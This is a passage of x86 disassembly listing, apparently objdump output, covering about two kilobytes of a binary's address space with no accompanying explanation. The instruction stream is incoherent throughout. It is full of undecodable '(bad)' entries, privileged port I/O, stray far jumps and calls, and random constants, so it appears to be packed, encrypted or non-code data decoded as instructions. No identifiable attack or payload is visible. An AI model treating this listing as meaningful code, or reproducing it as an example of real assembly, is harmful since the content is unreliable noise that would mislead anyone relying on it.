  407aac:	fcomp  QWORD PTR [ebx-0x77f5b875]
  407ab2:	dec    edx
  407ab3:	push   0xcb86f28c
  407ab8:	or     al,0xe9
  407aba:	(bad)  
  407abb:	xchg   esi,eax
  407abc:	aam    0xe9
  407abe:	pop    es
  407abf:	jge    0x407a80
  407ac1:	fnstcw WORD PTR [ebp+0x3a]
  407ac4:	pop    ds
  407ac5:	xchg   esi,eax
  407ac6:	ja     0x407aa3
  407ac8:	mov    dl,0x6d
  407aca:	clc    
  407acb:	int    0xa1
  407acd:	mov    dl,0xa
  407acf:	repnz xor dh,BYTE PTR [esi-0x7d]
  407ad3:	mov    ah,0x1d
  407ad5:	sub    eax,DWORD PTR [edx+0x71d51115]
  407adb:	shl    ah,cl
  407add:	(bad)  
  407adf:	js     0x407a78
  407ae1:	mov    dl,0x7f
  407ae3:	or     eax,0xb3ff5c3a
  407ae8:	fidivr DWORD PTR [edi]
  407aea:	and    al,0xac
  407aec:	popa   
  407aed:	jmp    0xaff81a55
  407af2:	fist   WORD PTR [edi+0x25fa8b6e]
  407af8:	stc    
  407af9:	cs aam 0x94
  407afc:	arpl   WORD PTR [esi],si
  407afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aff:	nop
  407b00:	push   es
  407b01:	pop    ecx
  407b02:	aaa    
  407b03:	inc    eax
  407b04:	mov    edi,DWORD PTR [edi+0x1c]
  407b07:	mov    al,0x9b
  407b09:	cld    
  407b0a:	mov    ah,0xab
  407b0c:	mov    es,WORD PTR [esi-0x6fa3733a]
  407b12:	rol    BYTE PTR ds:0x3d62548e,1
  407b18:	xor    dh,ch
  407b1a:	inc    bl
  407b1c:	or     al,BYTE PTR [eax+0x2d]
  407b1f:	std    
  407b20:	test   DWORD PTR [ebp+0x5a],esi
  407b23:	cwde   
  407b24:	je     0x407aeb
  407b26:	outs   dx,BYTE PTR ds:[esi]
  407b27:	fdivr  DWORD PTR [eax-0x6e30f264]
  407b2d:	dec    ecx
  407b2e:	dec    ecx
  407b2f:	repnz pop es
  407b31:	jbe    0x407ae1
  407b33:	aaa    
  407b34:	mov    ebp,0x4afeb20d
  407b39:	ds leave 
  407b3b:	adc    al,0x7e
  407b3d:	inc    ebx
  407b3e:	mov    DWORD PTR [ebp-0x73],ebx
  407b41:	mov    ecx,0xf23e65e9
  407b46:	add    DWORD PTR [esi],edx
  407b48:	push   0xc9fd597d
  407b4d:	lock jmp 0x22738edb
  407b53:	push   cs
  407b54:	cmp    DWORD PTR gs:[ebp+0x7fd46002],esp
  407b5b:	sbb    al,0xa9
  407b5d:	ss sbb al,0xe3
  407b60:	aam    0xa3
  407b62:	mov    DWORD PTR [edx-0x53666638],ecx
  407b68:	sub    eax,0xd9f3ce7f
  407b6d:	inc    eax
  407b6e:	fadd   DWORD PTR [ebp-0x13]
  407b71:	(bad)  
  407b72:	sbb    ecx,DWORD PTR [eax+0x72bd3a96]
  407b78:	fld    st(1)
  407b7a:	pop    esp
  407b7b:	shr    DWORD PTR [ebx],0xc9
  407b7e:	idiv   DWORD PTR [si+0x1c19]
  407b83:	adc    BYTE PTR [eax+eax*8-0x14c21e5d],0x33
  407b8b:	dec    edi
  407b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b8d:	lods   al,BYTE PTR ds:[esi]
  407b8e:	or     al,0xb7
  407b90:	jmp    0x407bed
  407b92:	popf   
  407b93:	mov    al,ds:0x351e6c78
  407b98:	pop    ecx
  407b99:	xor    ebp,edi
  407b9b:	enter  0x6c4d,0xe2
  407b9f:	cmp    al,BYTE PTR [ebp-0x613565b]
  407ba5:	lea    ecx,[ebx+edi*4]
  407ba8:	push   ebp
  407ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407baa:	mov    esp,0x7176f884
  407baf:	push   es
  407bb0:	sbb    DWORD PTR [edx-0x356082a3],0x8c17a441
  407bba:	in     ax,0x71
  407bbd:	mov    esi,0xc7c4cb0e
  407bc2:	loope  0x407c18
  407bc4:	pop    ecx
  407bc5:	(bad)  
  407bc6:	jmp    0x407bc0
  407bc8:	sti    
  407bc9:	dec    ecx
  407bca:	jl     0x407b8a
  407bcc:	and    eax,0xc36e9a5e
  407bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bd2:	push   esp
  407bd3:	fdiv   st,st(0)
  407bd5:	das    
  407bd6:	ret    0x28b0
  407bd9:	scas   eax,DWORD PTR es:[edi]
  407bda:	fmul   QWORD PTR [ecx]
  407bdc:	adc    DWORD PTR [ecx+0x59fecbfc],eax
  407be2:	shr    DWORD PTR [edi-0x41f1f119],0x72
  407be9:	push   edi
  407bea:	xchg   edi,eax
  407beb:	or     BYTE PTR [esp+ecx*8-0x66],ah
  407bef:	fcomp  QWORD PTR [ebx+esi*1-0x46]
  407bf3:	pusha  
  407bf4:	xor    ebx,edx
  407bf6:	lahf   
  407bf7:	jns    0x407bab
  407bf9:	cld    
  407bfa:	mov    fs,WORD PTR [edx-0x7668b04a]
  407c00:	xor    ah,BYTE PTR [esi+0x5a3d24ed]
  407c06:	adc    dl,BYTE PTR [ebp-0x68]
  407c09:	test   al,0xe5
  407c0b:	popf   
  407c0c:	cmp    ebp,edi
  407c0e:	arpl   WORD PTR [esp+edx*1+0x337f2bc1],dx
  407c15:	shl    bh,0xe7
  407c18:	push   ecx
  407c19:	outs   dx,DWORD PTR ds:[esi]
  407c1a:	push   ebx
  407c1b:	stos   DWORD PTR es:[edi],eax
  407c1c:	fdiv   DWORD PTR [edi-0xb]
  407c1f:	jecxz  0x407c4e
  407c21:	ja     0x407bde
  407c23:	push   0x79bbbc3b
  407c28:	hlt    
  407c29:	inc    edx
  407c2a:	ret    
  407c2b:	mov    esi,DWORD PTR [edx+0x658d459c]
  407c31:	in     al,0x45
  407c33:	lods   eax,DWORD PTR ss:[esi]
  407c35:	(bad)  
  407c36:	out    dx,eax
  407c37:	mov    cl,0x5f
  407c39:	out    dx,al
  407c3a:	pop    ss
  407c3b:	adc    eax,0xd063f15a
  407c40:	pop    DWORD PTR [ecx+0x31e7956e]
  407c46:	repz test BYTE PTR [edi],0x3
  407c4a:	ins    DWORD PTR es:[edi],dx
  407c4b:	rol    DWORD PTR ds:0xa6d0e6a7,cl
  407c51:	gs outs dx,BYTE PTR ss:[esi]
  407c54:	(bad)  
  407c55:	mov    bh,0xbc
  407c57:	or     DWORD PTR [eax+0x4f],eax
  407c5a:	sbb    DWORD PTR [eax],ebx
  407c5c:	jge    0x407cac
  407c5e:	mov    ds:0x61bfa2ea,eax
  407c63:	cmp    al,BYTE PTR [edx]
  407c65:	(bad)  
  407c66:	icebp  
  407c67:	adc    ebp,DWORD PTR [esi]
  407c69:	retf   0xe93c
  407c6c:	popf   
  407c6d:	add    al,0x23
  407c6f:	(bad)  [ecx]
  407c71:	jmp    0x650b243c
  407c76:	inc    esi
  407c77:	(bad)  
  407c78:	int    0xf6
  407c7a:	pop    es
  407c7b:	pop    ss
  407c7c:	je     0x407bfe
  407c7e:	xchg   BYTE PTR [edx+0x2e015d7c],cl
  407c84:	mov    ch,0x47
  407c86:	adc    BYTE PTR [esi+esi*4-0x44],ah
  407c8a:	jp     0x407c75
  407c8c:	mov    esp,0xe998fcf9
  407c91:	jmp    0x407c3a
  407c93:	jmp    0x9587:0x6f2def0b
  407c9a:	sbb    eax,0xb52cf87a
  407c9f:	cwde   
  407ca0:	mov    eax,0xc5ca66ad
  407ca5:	js     0x407ced
  407ca7:	pop    esi
  407ca8:	sub    DWORD PTR [ebp-0x3f],ebx
  407cab:	pop    ecx
  407cac:	mov    al,ds:0xd77a72d0
  407cb1:	xchg   edi,eax
  407cb2:	imul   ebx,DWORD PTR [ecx+0x7c],0x21
  407cb6:	pop    ss
  407cb7:	ss enter 0x7141,0x3f
  407cbc:	rol    BYTE PTR [ebp-0x80],1
  407cbf:	cld    
  407cc0:	sahf   
  407cc1:	in     al,dx
  407cc2:	add    bl,ch
  407cc4:	xor    BYTE PTR [ebp+0x55],cl
  407cc7:	les    edx,FWORD PTR [edi-0x50]
  407cca:	sbb    eax,0xb42450a6
  407ccf:	fwait
  407cd0:	pusha  
  407cd1:	dec    ebx
  407cd2:	mov    al,0xcb
  407cd4:	pop    ecx
  407cd5:	pop    esp
  407cd6:	mov    ah,0x9
  407cd8:	daa    
  407cd9:	xchg   ebp,eax
  407cda:	mov    dl,0x86
  407cdc:	bnd jp 0x407d0c
  407cdf:	fbstp  TBYTE PTR [edx-0x53be2500]
  407ce5:	xor    al,0x32
  407ce7:	out    0x1a,al
  407ce9:	push   es
  407cea:	mov    eax,ds:0x19f0491e
  407cef:	push   ebp
  407cf0:	mov    dh,0xd2
  407cf2:	jno    0x407d00
  407cf4:	div    BYTE PTR [edi]
  407cf6:	test   DWORD PTR [bp+0xa15],esi
  407cfb:	mov    dh,0x5f
  407cfd:	stos   DWORD PTR es:[edi],eax
  407cfe:	mov    al,BYTE PTR [edi]
  407d00:	scas   eax,DWORD PTR es:[edi]
  407d01:	cdq    
  407d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d03:	cmp    al,0x87
  407d05:	aaa    
  407d06:	mov    al,0x16
  407d08:	push   edx
  407d09:	dec    ecx
  407d0a:	loope  0x407c96
  407d0c:	icebp  
  407d0d:	aas    
  407d0e:	repz test BYTE PTR [eax+0x613abcb0],cl
  407d15:	inc    ebp
  407d16:	pop    edi
  407d17:	int3   
  407d18:	mov    edx,0xaf4eb675
  407d1d:	pop    ebp
  407d1e:	sbb    BYTE PTR [ebp+0x5a],bl
  407d21:	fstp   QWORD PTR [esi+0x44f3a3ad]
  407d27:	fnstcw WORD PTR [edi]
  407d29:	popa   
  407d2a:	(bad)  
  407d2c:	ins    DWORD PTR es:[edi],dx
  407d2d:	fdivrp st(6),st
  407d2f:	es (bad) 
  407d32:	test   BYTE PTR [ebp+0x9ecdf30],dl
  407d38:	loopne 0x407d50
  407d3a:	ficom  DWORD PTR [edx]
  407d3c:	xchg   DWORD PTR [esi+eiz*1-0x43],eax
  407d40:	lods   eax,DWORD PTR ds:[esi]
  407d41:	fldcw  WORD PTR [edx]
  407d43:	xor    DWORD PTR [edx],ecx
  407d45:	sahf   
  407d46:	jne    0x407d90
  407d48:	aad    0xd4
  407d4a:	call   0x994228b7
  407d4f:	dec    ebx
  407d50:	inc    esp
  407d51:	call   0x3948:0xf41d1c3d
  407d58:	dec    edi
  407d59:	loop   0x407d0d
  407d5b:	cs ins DWORD PTR es:[edi],dx
  407d5d:	mov    cs,WORD PTR [ecx]
  407d5f:	popf   
  407d60:	or     ah,0xa2
  407d63:	cmp    eax,0x43de6a81
  407d68:	push   ecx
  407d69:	mov    ecx,0xe525199e
  407d6e:	or     eax,0xa95c889b
  407d73:	popf   
  407d74:	call   0x2e02:0xd48cc613
  407d7b:	pushf  
  407d7c:	jne    0x407d04
  407d7e:	dec    esp
  407d7f:	push   eax
  407d80:	int    0x40
  407d82:	scas   eax,DWORD PTR es:[edi]
  407d83:	jecxz  0x407d22
  407d85:	mov    DWORD PTR [edx+0x68ab3ace],esi
  407d8b:	mov    ebx,DWORD PTR [ecx]
  407d8d:	out    dx,al
  407d8e:	mov    al,0xa2
  407d90:	loope  0x407d63
  407d92:	(bad)  
  407d94:	gs dec eax
  407d96:	inc    edx
  407d97:	mov    eax,ds:0xd62d8320
  407d9c:	daa    
  407d9d:	xor    DWORD PTR ds:0x19fc691b,esi
  407da3:	xor    DWORD PTR ds:0x5f006b80,ecx
  407da9:	sahf   
  407daa:	addr16 add eax,0x98e5f4a0
  407db0:	test   DWORD PTR [edi+ecx*1-0x46],ecx
  407db4:	xchg   al,bl
  407db6:	dec    esp
  407db7:	sbb    al,0x2d
  407db9:	das    
  407dba:	inc    esi
  407dbb:	push   ss
  407dbc:	add    eax,0xbc3b9c0d
  407dc1:	fwait
  407dc2:	cmp    al,0xf1
  407dc4:	or     ebp,DWORD PTR [edx-0x7c23c2b8]
  407dca:	in     eax,0x3c
  407dcc:	jnp    0x407d76
  407dce:	dec    eax
  407dcf:	addr16 push 0xfffffffd
  407dd2:	jl     0x407e1b
  407dd4:	scas   al,BYTE PTR es:[edi]
  407dd5:	gs cmp bh,bh
  407dd8:	add    eax,0x87df962d
  407ddd:	pushf  
  407dde:	pop    ebp
  407ddf:	push   esp
  407de0:	mov    eax,0x86c7c744
  407de5:	ja     0x407dc4
  407de7:	mov    dl,dl
  407de9:	sub    al,0x2e
  407deb:	sbb    BYTE PTR [edx],al
  407ded:	idiv   BYTE PTR [edx+0x1b]
  407df0:	sub    eax,0xe5dbcb3d
  407df5:	gs xchg edx,eax
  407df7:	int3   
  407df8:	inc    edx
  407df9:	mov    al,0x9c
  407dfb:	cwde   
  407dfc:	cmp    bh,dl
  407dfe:	dec    esp
  407dff:	mov    al,ds:0xcb73e57c
  407e04:	lds    ecx,FWORD PTR [edi+eax*8+0x45]
  407e08:	xor    ah,BYTE PTR [ebx]
  407e0a:	shl    DWORD PTR [edi+ebp*8-0x14edda31],0xa0
  407e12:	imul   edx,DWORD PTR [edx+eiz*4+0x79a85ff]
  407e1a:	mov    bh,0x13
  407e1c:	mov    DWORD PTR [esi],ecx
  407e1e:	lods   al,BYTE PTR ds:[esi]
  407e1f:	loopne 0x407e06
  407e21:	inc    BYTE PTR [edi+0x144df4b7]
  407e27:	lea    esp,[esi-0x6a87455]
  407e2d:	aas    
  407e2e:	mov    WORD PTR [eax],ds
  407e30:	inc    ebx
  407e31:	dec    ecx
  407e32:	mov    esi,0x2d74be70
  407e37:	and    esp,DWORD PTR ds:0x69725efa
  407e3d:	jns    0x407e8a
  407e3f:	sbb    ch,al
  407e41:	push   edi
  407e42:	repz sbb ecx,DWORD PTR [esi+0x112fddcf]
  407e49:	adc    DWORD PTR [edi+0x224b403e],0xf24cb114
  407e53:	mov    ebp,0x38669ac0
  407e58:	jbe    0x407ddd
  407e5a:	xor    esp,ebp
  407e5c:	fdiv   st,st(4)
  407e5e:	pop    edi
  407e5f:	rcl    BYTE PTR [edi-0x47],0x1
  407e63:	nop
  407e64:	xlat   BYTE PTR ds:[ebx]
  407e65:	cs pop ebp
  407e67:	cmp    al,0xdb
  407e69:	sbb    BYTE PTR [eax+0x7eee3c9f],ch
  407e6f:	cmp    DWORD PTR [esp+eiz*2-0x39bf6c57],ecx
  407e76:	sti    
  407e77:	mov    ds:0xc16bf6e0,eax
  407e7c:	out    dx,eax
  407e7d:	mov    esi,0x22e7b9a0
  407e82:	xor    DWORD PTR [ebx],edx
  407e84:	(bad)  
  407e85:	out    dx,eax
  407e86:	ja     0x407f07
  407e88:	jecxz  0x407e52
  407e8a:	loop   0x407e0e
  407e8c:	lea    esi,[eax]
  407e8e:	pop    esp
  407e8f:	jo     0x407f0b
  407e91:	rol    BYTE PTR ds:0x5f0f30c7,1
  407e97:	ret    
  407e98:	mov    gs,WORD PTR [ebx-0x3]
  407e9b:	cmc    
  407e9c:	sahf   
  407e9d:	(bad)  
  407e9e:	push   ebx
  407e9f:	mov    bl,0xc5
  407ea1:	xchg   edi,eax
  407ea2:	retf   0x949c
  407ea5:	fwait
  407ea6:	mov    cl,0x56
  407ea8:	add    eax,0xbd3ebee
  407ead:	mov    ecx,0x9711e3b3
  407eb2:	(bad)  
  407eb3:	adc    bh,BYTE PTR [edi+0x36]
  407eb6:	pop    es
  407eb7:	sbb    al,0x47
  407eb9:	dec    ebp
  407eba:	dec    ebx
  407ebb:	nop
  407ebc:	sub    BYTE PTR [edx],dh
  407ebe:	jle    0x407e82
  407ec0:	inc    edx
  407ec1:	stos   DWORD PTR es:[edi],eax
  407ec2:	ret    
  407ec3:	xchg   edi,eax
  407ec4:	inc    ebp
  407ec5:	mov    ah,0x99
  407ec7:	inc    ebp
  407ec8:	pop    esp
  407ec9:	jns    0x407e6e
  407ecb:	push   edi
  407ecc:	push   edi
  407ecd:	dec    edi
  407ece:	scas   eax,DWORD PTR es:[edi]
  407ecf:	addr16 sti 
  407ed1:	pop    es
  407ed2:	aam    0xb4
  407ed4:	mov    ch,BYTE PTR [eax]
  407ed6:	loope  0x407f0b
  407ed8:	cdq    
  407ed9:	and    esi,DWORD PTR [eax]
  407edb:	pushf  
  407edc:	jl     0x407eed
  407ede:	rcl    BYTE PTR [edi+edi*1+0x1e609c90],1
  407ee5:	inc    edx
  407ee6:	lock mov DWORD PTR [eax-0x16f4a7e4],eax
  407eed:	pop    ebx
  407eee:	mov    cl,0x53
  407ef0:	and    DWORD PTR [ebx-0x61916c35],esp
  407ef6:	xchg   ebp,eax
  407ef7:	lahf   
  407ef8:	xchg   edi,eax
  407ef9:	mov    al,0x55
  407efb:	lea    ebp,[edx+0x4f63f2a7]
  407f01:	inc    ecx
  407f02:	sbb    bl,BYTE PTR [ebx*8-0x15103da8]
  407f09:	int    0x4c
  407f0b:	push   cs
  407f0c:	xchg   ax,ax
  407f0e:	call   0x688111ca
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	fdiv   QWORD PTR [esi+0x66]
  407f17:	gs jno 0x407f95
  407f1a:	pop    ecx
  407f1b:	mov    esp,0x473f6304
  407f20:	inc    esp
  407f21:	inc    ecx
  407f22:	push   ebp
  407f23:	mov    esi,0xfa16318a
  407f28:	cmp    bl,0xe4
  407f2b:	xchg   ebx,eax
  407f2c:	xchg   esp,eax
  407f2d:	popf   
  407f2e:	inc    edi
  407f2f:	inc    ecx
  407f30:	cwde   
  407f31:	mov    ds:0x49a82424,eax
  407f36:	or     bh,BYTE PTR [ecx]
  407f38:	jb     0x407f7d
  407f3a:	pop    ebp
  407f3b:	shl    DWORD PTR [edx-0x31],1
  407f3e:	sbb    edi,edi
  407f40:	mov    ds:0x18c773c6,al
  407f45:	xchg   ebx,eax
  407f46:	(bad)  
  407f47:	stos   DWORD PTR es:[edi],eax
  407f48:	test   eax,0xd28e58b7
  407f4d:	pushf  
  407f4e:	push   eax
  407f4f:	mov    al,ds:0x2dd3d74d
  407f54:	dec    ecx
  407f55:	xchg   esp,eax
  407f56:	mov    ch,0xa3
  407f58:	inc    ecx
  407f59:	pushf  
  407f5a:	cmp    ebx,DWORD PTR [esi+0x74]
  407f5d:	icebp  
  407f5e:	mov    fs,WORD PTR [edx-0xd]
  407f61:	imul   edi,edi,0x71188c5c
  407f67:	jecxz  0x407f3c
  407f69:	inc    ebx
  407f6a:	addr16 mov bh,0x19
  407f6d:	sbb    cl,al
  407f6f:	adc    BYTE PTR [eax-0x4160cfd9],bl
  407f75:	mov    dl,0x90
  407f77:	aad    0xcb
  407f79:	lea    ebp,[esi]
  407f7b:	ins    DWORD PTR es:[edi],dx
  407f7c:	mov    esi,0xcbf12a09
  407f81:	lock (bad) 
  407f83:	mov    BYTE PTR [ebx+0x67],dh
  407f86:	test   al,0x97
  407f88:	ret    
  407f89:	in     eax,dx
  407f8a:	retf   0x19a4
  407f8d:	mov    ebx,0x63353795
  407f92:	(bad)  
  407f93:	(bad)  
  407f95:	jmp    0x317d:0xbb4f6c30
  407f9c:	inc    edi
  407f9d:	in     eax,dx
  407f9e:	xchg   edx,eax
  407f9f:	jb     0x407f7e
  407fa1:	outs   dx,BYTE PTR ds:[esi]
  407fa2:	or     BYTE PTR ds:0x7376cccd,0x8
  407fa9:	dec    esi
  407faa:	pop    ss
  407fab:	jns    0x408022
  407fad:	cli    
  407fae:	cmc    
  407faf:	sbb    ecx,ebx
  407fb1:	cmp    BYTE PTR [ebp+0xb],0x88
  407fb5:	adc    BYTE PTR [edi+edi*1],bl
  407fb8:	das    
  407fb9:	mov    al,0xd9
  407fbb:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  407fbd:	dec    edx
  407fbe:	clc    
  407fbf:	adc    al,BYTE PTR [edi-0x59]
  407fc2:	dec    edx
  407fc3:	xor    al,0x89
  407fc5:	inc    esp
  407fc6:	imul   DWORD PTR [ebp+0x32a54073]
  407fcc:	fs ds mov ebx,0x25ca170c
  407fd3:	sub    eax,0x25170614
  407fd8:	mov    dl,0xeb
  407fda:	push   es
  407fdb:	mov    ah,0x81
  407fdd:	xor    ebx,DWORD PTR [ecx-0x8]
  407fe0:	repz sbb DWORD PTR [edx+0x43],edi
  407fe4:	xor    ecx,DWORD PTR [edi]
  407fe6:	jne    0x408020
  407fe8:	stos   BYTE PTR es:[edi],al
  407fe9:	daa    
  407fea:	xchg   ebp,eax
  407feb:	adc    eax,0x1a5efeba
  407ff0:	mov    eax,ds:0x5fc30fd7
  407ff5:	(bad)  
  407ff6:	sbb    ah,dl
  407ff8:	jp     0x407f9c
  407ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ffb:	inc    esi
  407ffc:	test   al,0xc5
  407ffe:	not    BYTE PTR [edi]
  408000:	xchg   ecx,eax
  408001:	sahf   
  408002:	dec    eax
  408003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408004:	pushf  
  408005:	or     eax,0x3a32a88f
  40800a:	xchg   BYTE PTR [esi],cl
  40800c:	xor    eax,0x545cd0f4
  408011:	out    dx,al
  408012:	enter  0xba4b,0xe
  408016:	kandb  k5,k3,k6
  40801a:	sub    DWORD PTR [ebx-0x7c2478ab],ebx
  408020:	cld    
  408021:	mov    eax,0x474b5570
  408026:	jns    0x407fc3
  408028:	pop    ebx
  408029:	jg     0x40804d
  40802b:	call   edi
  40802d:	aas    
  40802e:	(bad)  
  40802f:	fcom   st(4)
  408031:	pop    eax
  408032:	sub    al,0x57
  408034:	push   ecx
  408035:	adc    dl,BYTE PTR ds:0x3e68f655
  40803b:	stc    
  40803c:	pushf  
  40803d:	lock mov dl,0x8c
  408041:	push   esi
  408042:	mov    al,ds:0x3a64f07c
  408047:	dec    eax
  408048:	push   eax
  408049:	mov    ecx,DWORD PTR [ebx-0x24]
  40804c:	icebp  
  40804d:	out    dx,al
  40804e:	sub    DWORD PTR [ebp+0x53c67552],ebp
  408054:	sub    eax,0x74669dc6
  408059:	and    esp,esi
  40805b:	adc    DWORD PTR [edi+0x2709be8],esp
  408061:	xchg   ecx,eax
  408062:	cmp    DWORD PTR [ebx-0x1f18929a],ecx
  408068:	push   0xffffffeb
  40806a:	ror    DWORD PTR [esi+esi*4+0x0],0x16
  40806f:	and    eax,0x514bdc74
  408074:	xor    ebx,DWORD PTR [edi-0x79]
  408077:	int3   
  408078:	dec    ebx
  408079:	mov    dl,0xed
  40807b:	repz sub BYTE PTR [ecx-0x1b],ah
  40807f:	push   0xfffffff8
  408081:	out    0xf9,al
  408083:	hlt    
  408084:	lods   al,BYTE PTR ds:[esi]
  408085:	push   edi
  408086:	(bad)  
  408087:	out    0x56,eax
  408089:	or     ah,ch
  40808b:	xor    DWORD PTR [ecx+0x4f],0x6c
  40808f:	scas   eax,DWORD PTR es:[edi]
  408090:	ins    BYTE PTR es:[edi],dx
  408091:	mov    cl,0xdd
  408093:	mov    ebx,0xf5b71328
  408098:	call   0xeb86:0xb762b167
  40809f:	or     DWORD PTR [eax-0x362a7049],esp
  4080a5:	or     eax,0xa51ef451
  4080aa:	imul   DWORD PTR [edi]
  4080ac:	stos   DWORD PTR es:[edi],eax
  4080ad:	or     BYTE PTR [ecx+0x79],bl
  4080b0:	mov    bl,0x9b
  4080b2:	xor    eax,0xb260b7b9
  4080b7:	retf   
  4080b8:	xor    ebp,edi
  4080ba:	pop    ecx
  4080bb:	out    0x25,eax
  4080bd:	xchg   edx,eax
  4080be:	add    cl,BYTE PTR [esp+eiz*8-0x2896d921]
  4080c5:	cld    
  4080c6:	cmp    eax,0x44856481
  4080cb:	nop
  4080cc:	push   0x5d
  4080ce:	mov    ds:0x34242d7c,al
  4080d3:	inc    ebx
  4080d4:	mov    bl,0xbc
  4080d6:	fcom   DWORD PTR [eax-0x72]
  4080d9:	mov    cl,0xe0
  4080db:	fst    QWORD PTR [eax+0x6d]
  4080de:	in     al,0x5e
  4080e0:	in     eax,dx
  4080e1:	inc    ebp
  4080e2:	pop    ds
  4080e3:	xlat   BYTE PTR ds:[ebx]
  4080e4:	fmul   QWORD PTR [ebp-0x1a17200d]
  4080ea:	push   ebx
  4080eb:	jl     0x4080e1
  4080ed:	out    dx,al
  4080ee:	mov    cl,0xe3
  4080f0:	jne    0x408150
  4080f2:	adc    BYTE PTR [ebx],dh
  4080f4:	rol    ebp,cl
  4080f6:	pop    esi
  4080f7:	(bad)  
  4080f8:	mov    cl,0x76
  4080fa:	int3   
  4080fb:	xchg   DWORD PTR [edi],ecx
  4080fd:	rcl    DWORD PTR [ecx+0x3f],1
  408100:	mov    cl,0x1c
  408102:	mov    dl,0xbf
  408104:	mov    ebx,0xa7c24f24
  408109:	sub    BYTE PTR [esi+0x6c],dh
  40810c:	push   esp
  40810d:	fnstsw WORD PTR [edx-0x49]
  408110:	adc    ebx,0x16
  408113:	scas   eax,DWORD PTR es:[edi]
  408114:	loope  0x408113
  408116:	xor    eax,0xa6e790fa
  40811b:	in     eax,0x61
  40811d:	frstor [edx]
  40811f:	(bad)  
  408120:	cwde   
  408121:	(bad)  
  408122:	pop    esp
  408123:	cmp    bl,BYTE PTR [esp+edi*1+0x54]
  408127:	(bad)  
  408128:	jmp    0x9300:0x6d6880ef
  40812f:	test   BYTE PTR ds:0xbf694092,bh
  408135:	or     eax,0xabdf252
  40813a:	adc    ah,BYTE PTR [ebp-0x30]
  40813d:	int    0x94
  40813f:	jge    0x4080d6
  408141:	ja     0x4080fa
  408143:	xchg   ecx,eax
  408144:	imul   esi,DWORD PTR [edi-0x50],0xab452657
  40814b:	mov    WORD PTR [bx+si],ss
  40814e:	xchg   ecx,eax
  40814f:	out    0x21,al
  408151:	and    DWORD PTR [edx+0x5e1b9edb],esi
  408157:	call   0xbfd0bcd1
  40815c:	inc    ecx
  40815d:	or     ecx,DWORD PTR [ecx]
  40815f:	and    esi,DWORD PTR [ebp+0x18]
  408162:	stos   DWORD PTR es:[edi],eax
  408163:	out    0xbf,eax
  408165:	xchg   BYTE PTR [eax+0x7f],ch
  408168:	or     al,0x35
  40816a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40816b:	es push esi
  40816d:	xor    esp,DWORD PTR [esi]
  40816f:	ja     0x4081dc
  408171:	dec    edx
  408172:	adc    ecx,0xc2fa7203
  408178:	add    BYTE PTR [eax-0x48],0x9d
  40817c:	loope  0x408175
  40817e:	adc    al,0xd7
  408180:	sub    esp,ecx
  408182:	in     eax,0x50
  408184:	fldcw  WORD PTR cs:[ebp+0x564f5a57]
  40818b:	xor    edi,DWORD PTR [esp+eiz*8-0x7158a499]
  408192:	cmc    
  408193:	xchg   edx,eax
  408194:	or     edx,ebx
  408196:	add    dl,bh
  408198:	xor    ebx,eax
  40819a:	call   0x89990439
  40819f:	mov    WORD PTR [eax+0x41],cs
  4081a2:	lods   al,BYTE PTR ds:[esi]
  4081a3:	xor    eax,0x323bb7f
  4081a8:	dec    esp
  4081a9:	int3   
  4081aa:	(bad)  
  4081ab:	push   ecx
  4081ac:	xor    eax,0xa577d5fe
  4081b1:	ds xchg edx,eax
  4081b3:	mov    ds:0xcce368e9,al
  4081b8:	add    al,0xe4
  4081ba:	xchg   esi,eax
  4081bb:	call   0xb1a63440
  4081c0:	in     eax,dx
  4081c1:	or     DWORD PTR [ebx-0x69],ecx
  4081c4:	lods   al,BYTE PTR ds:[esi]
  4081c5:	push   es
  4081c6:	loope  0x408230
  4081c8:	in     eax,0x3
  4081ca:	clc    
  4081cb:	mov    al,0x13
  4081cd:	mov    BYTE PTR [eax+0x5cc1c6d5],dl
  4081d3:	mov    esp,0x6e3daf7c
  4081d8:	nop
  4081d9:	push   ebx
  4081da:	fcomp  QWORD PTR [ecx-0x6a953253]
  4081e0:	ss pop eax
  4081e2:	fmul   QWORD PTR [ebx]
  4081e4:	cld    
  4081e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e6:	sar    DWORD PTR ds:[ecx+0x3e],0xf8
  4081eb:	mov    WORD PTR [edi+0x66],fs
  4081ee:	cmc    
  4081ef:	push   ecx
  4081f0:	das    
  4081f1:	or     al,0xfa
  4081f3:	mov    WORD PTR [eax],gs
  4081f5:	int3   
  4081f6:	and    al,ah
  4081f8:	push   es
  4081f9:	xchg   edx,eax
  4081fa:	cmp    eax,0x2f07ba57
  4081ff:	mov    bl,BYTE PTR [ecx-0xa]
  408202:	pop    ebp
  408203:	adc    BYTE PTR [ebx-0x48],dh
  408206:	repz cmp al,0x24
  408209:	(bad)  
  40820a:	add    ah,bl
  40820c:	(bad)  
  40820d:	fld    TBYTE PTR [edx]
  40820f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408210:	xchg   bh,bl
  408212:	popf   
  408213:	pop    esp
  408214:	fcomp  st(3)
  408216:	jb     0x408203
  408218:	sbb    esi,DWORD PTR [eax-0x1e]
  40821b:	xchg   esp,eax
  40821c:	sub    dh,BYTE PTR [eax]
  40821e:	shr    ebx,1
  408220:	mov    WORD PTR [edi-0x69],?
  408223:	or     DWORD PTR [eax],esi
  408225:	adc    BYTE PTR [ebx+0x2ccc0844],ch
  40822b:	and    DWORD PTR [edi-0x71],edi
  40822e:	push   DWORD PTR [edi]
  408230:	out    dx,eax
  408231:	xchg   ebx,eax
  408232:	out    dx,eax
  408233:	pusha  
  408234:	push   0x963602e1
  408239:	adc    esi,edx
  40823b:	shl    DWORD PTR [ecx-0x30],1
  40823e:	sbb    al,0x2b
  408240:	jmp    0xeaa1:0x6df2e424
  408247:	call   0x11a:0xf29271db
  40824e:	mov    bl,0x1f
  408250:	jl     0x4081f5
  408252:	adc    edx,esp
  408254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408255:	mov    esi,0x483304d4
